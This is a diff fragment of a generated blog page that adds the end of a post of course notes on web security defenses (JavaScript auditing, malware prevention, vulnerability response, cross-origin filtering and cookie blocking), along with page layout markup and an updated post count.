+<p>Auditing system: monitor execution of JavaScript code and compare the operations against high-level policies to detect malicious behavior.</p>
+<hr>
+<h2 id="Malware-Prevention"><a href="#Malware-Prevention" class="headerlink" title="Malware Prevention"></a>Malware Prevention</h2><p>Goal: Reduce the harm.</p>
+<h3 id="Preventing-the-Introduction"><a href="#Preventing-the-Introduction" class="headerlink" title="Preventing the Introduction"></a>Preventing the Introduction</h3><h3 id="Vulnerability-Response"><a href="#Vulnerability-Response" class="headerlink" title="Vulnerability Response"></a>Vulnerability Response</h3><p>Discovery, Publication, Patch available, Patch deployed.</p>
+<h3 id="Failure-Containment"><a href="#Failure-Containment" class="headerlink" title="Failure Containment"></a>Failure Containment</h3><p>Gazelle’s Approach</p>
+<ul>
+<li>Inspect cross-origin HTTP responses</li>
+<li>Filter unexpected content types</li>
+</ul>
+<p>Another approach: Cookie Blocking</p>
+<p>Block the “Cookie” header for cross-domain resource loads.</p>
+<p>deterministic function cannot produce pure random..</p>
+</script></p>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/19/Digital Communities Notes P3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -970,7 +1648,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">4</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
